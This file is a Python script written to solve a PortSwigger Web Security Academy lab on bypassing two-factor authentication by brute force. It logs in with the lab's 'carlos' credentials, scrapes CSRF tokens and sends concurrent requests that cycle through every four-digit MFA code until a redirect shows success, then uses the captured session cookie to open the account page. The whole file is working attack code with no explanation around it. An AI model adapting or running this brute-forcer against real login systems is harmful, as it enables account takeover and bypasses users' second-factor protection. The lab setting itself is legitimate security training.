#https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
import asyncio
import re
import httpx
from bs4 import BeautifulSoup

url = "https://0ae800e60395e4af80b9b28d009200e7.web-security-academy.net"
login = f"{url}/login"
login2 = f"{url}/login2"
semaphore = asyncio.Semaphore(24)

# Async CSRF fetch using regex for speed
def csrf_fetch(response_text):
    match = re.search(r'name="csrf" value="(.+?)"', response_text)
    return match.group(1) if match else None

# Login and return session cookies
async def re_login(client):
    response = await client.get(login)
    csrf_token = csrf_fetch(response.text)
    login_payload = {
        "username": "carlos",
        "password": "montoya",
        "csrf": csrf_token
    }
    r = await client.post(login, data=login_payload, follow_redirects=False)
    return r.cookies

# Attempts a single MFA code
async def try_code(mfa_code):
    async with semaphore:
        async with httpx.AsyncClient(follow_redirects=False) as client:
            try:
                cookies = await re_login(client)

                # MFA Step
                login2_page = await client.get(login2, cookies=cookies)
                mfa_payload = {
                    'csrf': csrf_fetch(login2_page.text),
                    'mfa-code': mfa_code
                }
                mfa_response = await client.post(login2, data=mfa_payload, cookies=cookies)

                print(f"Trying code {mfa_code}, status {mfa_response.status_code}", flush=True)
                if mfa_response.status_code == 302:  # Success
                    print(f"[SUCCESS] Correct MFA Code: {mfa_code}")
                    # print(f"cookies: {cookies}")
                    print(f"payload: {mfa_payload}")
                    print(f"response headers: {mfa_response.headers}")
                    return mfa_response.headers
                return None
            except httpx.ConnectTimeout:
                print(f"[TIMEOUT] Connection timed out for MFA code: {mfa_code}")
            except httpx.ReadTimeout:
                print(f"[TIMEOUT] Server took too long to respond for MFA code: {mfa_code}")
            except httpx.RequestError as e:
                print(f"[NETWORK ERROR] {e} for MFA code: {mfa_code}")
            except asyncio.TimeoutError:
                print(f"[ASYNC TIMEOUT] Task timeout for MFA code: {mfa_code}")

async def main():
    while True:
        tasks = []
        for i in range(1000, 10000):
            tasks.append(asyncio.create_task(try_code(i)))

        for future in asyncio.as_completed(tasks):
            result = await future
            if result:
                match = re.search(r'session=([^;]+)', result['set-cookie'])
                if match:
                    session_value = match.group(1)
                carlos_url = url + result['location']
                r = httpx.get(url=carlos_url, headers={'Cookie': f'session={session_value}'})
                #request the carlos account page to finish the lab
                print(f"login status code: {r.status_code}")
                for task in tasks:
                    task.cancel()
                exit(0)

if __name__ == "__main__":
    asyncio.run(main())
